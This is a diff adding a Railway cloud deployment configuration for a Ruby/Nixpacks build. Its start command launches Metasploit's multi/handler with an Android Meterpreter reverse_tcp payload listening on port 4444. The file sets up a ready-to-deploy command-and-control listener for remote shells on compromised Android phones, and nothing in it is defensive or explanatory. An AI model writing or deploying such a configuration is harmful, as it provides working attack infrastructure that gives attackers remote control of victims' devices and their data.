@@ -1,0 +1,17 @@
+{
+  "$schema": "https://railway.app/railway.schema.json",
+  "build": {
+    "builder": "NIXPACKS",
+    "nixpacksPlan": {
+      "providers": ["ruby"],
+      "phases": {
+        "setup": { "nixPkgs": ["ruby_3_2", "postgresql_15", "git", "bundler"] },
+        "install": { "cmds": ["bundle install --without development test"] }
+      }
+    }
+  },
+  "deploy": {
+    "startCommand": "msfdb init && msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j'",
+    "restartPolicyType": "ON_FAILURE"
+  }
+}
